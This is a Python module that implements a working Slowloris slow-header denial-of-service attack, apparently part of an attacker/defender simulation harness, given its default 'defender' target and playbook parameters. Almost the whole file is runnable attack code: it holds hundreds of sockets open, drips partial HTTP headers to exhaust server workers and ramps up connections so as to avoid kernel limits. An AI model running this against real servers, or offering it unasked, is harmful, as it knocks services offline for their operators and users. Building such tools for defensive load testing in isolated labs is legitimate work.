"""Slowloris-style slow header attack.

Holds `concurrentConnections` open TCP sockets to the target, dripping a
partial HTTP request header every `sendIntervalMs` to keep server workers
tied up. Counts established connections as `successful`, RST/close as
`errors`. Block detection here is best-effort: if the peer immediately
returns 429 we count it as blocked.
"""
from __future__ import annotations

import asyncio
import logging
import random
import socket
import time
from typing import Any, Dict
from urllib.parse import urlparse

from .metrics import MetricsCollector

log = logging.getLogger("attacker.slowloris")


def _parse_target(url: str) -> tuple[str, int, str]:
    p = urlparse(url if "://" in url else f"http://{url}")
    host = p.hostname or "localhost"
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port, p.hostname or host


async def _hold_connection(
    host: str,
    port: int,
    host_header: str,
    endpoint: str,
    user_agent: str,
    interval_s: float,
    deadline: float,
    metrics: MetricsCollector,
) -> None:
    loop = asyncio.get_event_loop()
    sock: socket.socket | None = None
    t0 = time.perf_counter()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        try:
            await asyncio.wait_for(loop.sock_connect(sock, (host, port)), timeout=5.0)
        except (asyncio.TimeoutError, OSError):
            metrics.record(error=True, latency_ms=(time.perf_counter() - t0) * 1000.0)
            return

        initial = (
            f"GET {endpoint} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Accept: */*\r\n"
        ).encode()
        try:
            await loop.sock_sendall(sock, initial)
        except OSError:
            metrics.record(error=True, latency_ms=(time.perf_counter() - t0) * 1000.0)
            return

        # Connection established (held) — count as success
        metrics.record(success=True, latency_ms=(time.perf_counter() - t0) * 1000.0)

        # Quick non-blocking peek for an immediate 429 (defender pre-rejects)
        try:
            sock.setblocking(False)
            data = sock.recv(64)
            if data and b"429" in data:
                metrics.record(blocked=True)
                return
        except (BlockingIOError, OSError):
            pass

        # Drip partial header every interval until deadline
        while time.time() < deadline:
            await asyncio.sleep(interval_s)
            drip = f"X-Pad-{random.randint(0, 99999)}: {random.randint(0, 99999)}\r\n".encode()
            try:
                await loop.sock_sendall(sock, drip)
            except OSError:
                metrics.record(error=True)
                return
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass


async def run(playbook: Dict[str, Any], metrics: MetricsCollector) -> None:
    params = playbook.get("parameters", {})
    target_url: str = params.get("targetUrl", "http://defender:8080")
    endpoints = params.get("targetEndpoints") or ["/"]
    user_agents = params.get("userAgents") or ["Mozilla/5.0"]
    concurrency = int(params.get("concurrentConnections", 100))
    send_interval_ms = int(params.get("sendIntervalMs") or 10000)
    duration = int(params.get("durationSec", 30))

    host, port, host_header = _parse_target(target_url)
    interval_s = send_interval_ms / 1000.0
    deadline = time.time() + duration

    log.info(
        "slowloris start %s:%d concurrency=%d interval=%.1fs duration=%ds endpoints=%d",
        host, port, concurrency, interval_s, duration, len(endpoints),
    )

    tasks = []
    for i in range(concurrency):
        ep = endpoints[i % len(endpoints)]
        ua = user_agents[i % len(user_agents)]
        tasks.append(asyncio.create_task(
            _hold_connection(host, port, host_header, ep, ua, interval_s, deadline, metrics)
        ))
        # Stagger ramp-up so we don't SYN-flood the kernel
        if i % 50 == 49:
            await asyncio.sleep(0.05)

    await asyncio.gather(*tasks, return_exceptions=True)

    log.info("slowloris done total=%d ok=%d blocked=%d err=%d", metrics.total, metrics.successful, metrics.blocked, metrics.errors)
